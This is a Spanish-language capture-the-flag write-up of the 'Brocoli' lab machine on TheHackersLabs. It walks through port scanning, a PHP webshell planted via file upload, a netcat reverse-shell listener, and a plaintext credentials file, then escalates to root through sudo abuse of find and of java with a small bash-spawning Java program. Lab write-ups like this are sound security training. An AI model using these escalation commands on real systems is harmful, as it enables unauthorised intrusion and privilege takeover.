# CTF Máquina Brocoli

**Fecha:** 1 de julio de 2026  
**Dirección IP Objetivo:** `192.168.`  
**Dirección IP Atacante:** `192.168.`  
**Plataforma / Laboratorio:** TheHackersLabs  

---

## 1. Fase de Reconocimiento y Enumeración

### Escaneo Inicial de Puertos (Nmap)
Se ejecutó un escaneo silencioso sobre todo el rango de puertos TCP (`65535`) para identificar vectores de entrada.

```bash
sudo nmap -p- --open -sS -vn -Pn 192.168.
```

**Resultado:**
*   **Puerto 22/tcp:** Abierto (SSH)
*   **Puerto 80/tcp:** Abierto (HTTP)

### Escaneo Agresivo de Servicios y Versiones
Se ejecutó un análisis dirigido a los puertos identificados para extraer firmas de software y versiones exactas.

```bash
nmap -p22,80 -sCV 192.168.
```

*   **Puerto 22 (SSH):** `OpenSSH 9.6p1 Ubuntu 3ubuntu13.13` (Sistema Operativo: Ubuntu Linux).
*   **Puerto 80 (HTTP):** `Apache httpd 2.4.58 ((Ubuntu))`. Servidor web exponiendo la página por defecto de Apache2.

---

## 2. Acceso Inicial (Intrusión)

Se detectó una vulnerabilidad de carga de archivos (Arbitrary File Upload) en la ruta `/uploads/` del servidor web Apache. Se subió una webshell en lenguaje PHP (`brocoli.php`) que permitió la ejecución remota de comandos (RCE).

### Recepción de la Shell Reversa
Desde la máquina atacante se levantó un oyente TCP en el puerto `9000`:

```bash
nc -lvnp 9000
```

Se interactuó con la webshell y se recibió la conexión entrante, obteniendo acceso con los privilegios del servidor web: `www-data@TheHackersLabs-Brocoli`.

### Post-Explotación Inicial
Inspeccionando los directorios del sistema, se descubrió un archivo crítico en el directorio `/opt`:

```bash
ls /opt
# Resultado: credenciales.txt

cat /opt/credenciales.txt
```

**Credenciales expuestas encontradas:**
*   **Usuario:** `brocoli`
*   **Contraseña:** `megustalafruta`

---

## 3. Estabilización de la Terminal (Tratamiento TTY)

Debido a problemas iniciales con el comando `fg` al intentar estabilizar la terminal de forma clásica, se aplicó la secuencia de escape y configuración de variables del entorno para obtener una terminal interactiva completa:

```bash
# Dentro de la máquina víctima (invocación de bash interna)
script /dev/null -c bash

# (Se envió a background con Ctrl+Z en la máquina atacante)
stty raw -echo; fg
reset xterm

# Configuración de variables de entorno y dimensiones de pantalla
export TERM=xterm
export SHELL=bash
stty rows 45 columns 180
```

---

## 4. Movimiento Lateral: de `www-data` a `brocoli`

Con las credenciales encontradas en el archivo de texto, se procedió a migrar de contexto al usuario del sistema:

```bash
su brocoli
# Contraseña: megustalafruta
```

---

## 5. Escalada de Privilegios

### Paso 1: De `brocoli` a `brocolon` (Abuso de `find`)
Se listaron las capacidades de administración del usuario `brocoli` mediante sudo:

```bash
sudo -l
```

**Configuración detectada:**
```text
User brocoli may run the following commands on TheHackersLabs-Brocoli:
    (brocolon) NOPASSWD: /usr/bin/find
```

El usuario podía ejecutar `/usr/bin/find` como el usuario `brocolon` sin proporcionar contraseña. Se explotó la ejecución nativa de comandos de `find` ([GTFOBins](https://github.io)) para spawnear una shell:

```bash
sudo -u brocolon /usr/bin/find /dev/null -exec /bin/bash -p \;
```
**Éxito:** Acceso concedido como el usuario `brocolon`.

### Paso 2: De `brocolon` a `root` (Abuso de `java`)
Una vez en la sesión de `brocolon`, se repitió la enumeración de privilegios de sudo:

```bash
sudo -l
```

**Configuración detectada:**
```text
User brocolon may run the following commands on TheHackersLabs-Brocoli:
    (ALL : ALL) NOPASSWD: /usr/bin/java
```

Se identificó que el binario de Java (`/usr/bin/java`) podía ejecutarse como cualquier usuario (incluido `root`) sin contraseña.

Para aprovechar esto, se creó un exploit en código fuente Java dentro del directorio `/tmp` (`root.java`) diseñado para realizar una llamada al sistema e invocar una consola bash:

```java
import java.io.*;

public class root {
    public static void main(String[] args) throws Exception {
        Process p = new ProcessBuilder("/bin/bash").inheritIO().start();
        p.waitFor();
    }
}
```

Se procedió a ejecutar el código fuente directamente con el binario de Java aprovechando los privilegios máximos otorgados por sudo:

```bash
sudo java root.java
```

**Resultado:** El programa ejecutó la consola `/bin/bash` bajo el contexto de superusuario de manera exitosa.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

¡Máquina **Brocoli** completamente comprometida! 🚀
